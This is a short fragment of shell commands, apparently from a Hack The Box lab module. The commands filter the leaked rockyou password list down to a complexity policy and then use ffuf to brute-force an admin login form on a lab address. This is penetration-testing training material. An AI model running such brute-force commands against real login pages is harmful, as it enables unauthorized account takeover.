...
```shell-session
Pangulin@htb[/htb]$ wc -l /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
...
```shell-session
Pangulin@htb[/htb]$ grep '[[:upper:]]' /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt

Pangulin@htb[/htb]$ wc -l custom_wordlist.txt
...
```shell-session
Pangulin@htb[/htb]$ ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
